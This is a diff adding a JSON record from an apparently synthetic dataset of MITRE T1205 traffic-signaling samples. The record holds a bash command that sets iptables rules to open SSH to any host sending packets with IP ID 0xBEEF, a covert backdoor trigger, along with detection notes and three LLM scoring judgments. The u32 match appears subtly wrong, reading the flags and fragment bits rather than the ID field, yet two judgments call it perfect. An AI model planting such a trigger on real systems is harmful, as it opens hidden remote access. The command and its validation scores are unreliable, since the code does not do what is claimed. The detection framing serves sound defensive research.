@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -lc 'ufw --force enable && ufw default deny incoming && ufw logging high && iptables -I ufw-before-input 1 -m u32 --u32 \"4&0xFFFF=0xBEEF\" -m recent --name IPIDK --set && iptables -I ufw-before-input 1 -p tcp --dport 22 -m recent --rcheck --seconds 30 --name IPIDK -j ACCEPT'",
+  "explanation": "Uses an IP header Identification field value of 0xBEEF as a covert signal. Any packet with this IPID marks the source and temporarily opens SSH. This exploits non-standard header values as signaling. Detection: Analyze IP headers for fixed, unusual IPID values and correlate with sudden SSH acceptance from the same IP.",
+  "rationale_steps": [
+    "Enable ufw, set deny incoming, and logging.",
+    "Match packets whose IP header ID equals 0xBEEF and record the sender via recent:IPIDK.",
+    "Allow TCP/22 if the sender is recorded within 30 seconds.",
+    "Detect with packet capture looking for anomalous IPID constants and subsequent firewall allows."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-eb871457-0858f9ac",
+  "source_prompt_hash": "eb871457",
+  "timestamp_utc": "2025-09-30T03:48:01.284804Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, proper && chaining, and valid ufw/iptables option syntax.",
+        "semantic_score": 3,
+        "semantic_justification": "It conceptually implements T1205 by signaling via an IP header and using iptables recent to open SSH, but the u32 mask likely mismatches the IP ID field and root privileges are required despite 'Privilege: None', reducing practical correctness.",
+        "combined_score": 4.0,
+        "confidence": 0.72,
+        "timestamp": "2025-10-01T14:13:54.146946Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper use of && separators, valid iptables flags including -m u32 with correct --u32 expression syntax, and all arguments are syntactically coherent.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements a port-knocking/traffic-signaling mechanism using the IP Identification field (0xBEEF) via iptables u32 matching to mark source IPs with the 'recent' module, then conditionally allows SSH access within a 30-second window — a textbook implementation of T1205 covert signaling using non-standard IP header values.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2026-02-19T03:47:39.661896Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a properly structured bash string with correct use of logical operators, balanced quoting for the u32 module, and valid flags for both ufw and iptables.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements traffic signaling by using the iptables u32 module to inspect the IP Identification header for the value 0xBEEF and the recent module to dynamically grant SSH access, which is a textbook implementation of T1205.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T03:47:43.554739Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
